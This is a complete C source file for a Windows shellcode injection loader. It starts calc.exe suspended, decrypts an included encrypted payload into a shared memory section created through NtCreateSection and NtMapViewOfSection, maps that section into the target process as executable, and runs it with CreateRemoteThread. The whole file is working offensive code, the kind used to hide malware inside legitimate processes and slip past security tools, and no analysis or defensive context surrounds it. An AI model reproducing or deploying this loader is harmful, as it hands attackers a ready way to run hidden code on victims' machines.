#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "encrypted_shellcode.c"

#pragma comment(lib, "ntdll.lib")

#define ViewUnmap 2

typedef NTSTATUS(NTAPI* PNT_CREATE_SECTION)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* PNT_MAP_VIEW_OF_SECTION)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    ULONG InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

int main() {
    // Step 1: Launch calc.exe
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    if (!CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Failed to launch calc.exe.\n");
        return 1;
    }

    HANDLE hTargetProcess = OpenProcess(0x1f0fff, 0, pi.dwProcessId);

    // Step 2: Obtain function pointers to NtCreateSection and NtMapViewOfSection
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    if (!hNtdll) {
        printf("Failed to get handle for ntdll.dll.\n");
        return 1;
    }

    PNT_CREATE_SECTION NtCreateSection = (PNT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
    PNT_MAP_VIEW_OF_SECTION NtMapViewOfSection = (PNT_MAP_VIEW_OF_SECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection) {
        printf("Failed to get function addresses.\n");
        return 1;
    }

    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = 0x1000; // Size of the section

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &maxSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (status != 0) {
        printf("NtCreateSection failed.\n");
        return 1;
    }

    PVOID localSectionAddress = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &localSectionAddress,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_READWRITE
    );

    if (status != 0) {
        printf("NtMapViewOfSection (local) failed.\n");
        return 1;
    }

    // Copy the payload into the mapped view
    unsigned char buf;
    for (int i=0; i < sizeof(encrypted_shellcode); i++){
        buf = get_shellcode_byte(i);
        memcpy(localSectionAddress+i, &buf, sizeof(buf));
    }

    PVOID remoteSectionAddress = NULL;
    status = NtMapViewOfSection(
        hSection,
        hTargetProcess,
        &remoteSectionAddress,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_READ
    );

    if (status != 0) {
        printf("NtMapViewOfSection (remote) failed.\n");
        return 1;
    }

    // Create a remote thread in the target process
    HANDLE hRemoteThread = CreateRemoteThread(
        hTargetProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteSectionAddress,
        NULL,
        0,
        NULL
    );

    if (hRemoteThread == NULL) {
        printf("CreateRemoteThread failed.\n");
        return 1;
    }

    // Resume the suspended calc.exe process
    ResumeThread(pi.hThread);

    printf("Injection successful.\n");

    CloseHandle(hRemoteThread);
    CloseHandle(hTargetProcess);
    CloseHandle(hSection);
    CloseHandle(pi.hThread);

    return 0;
}
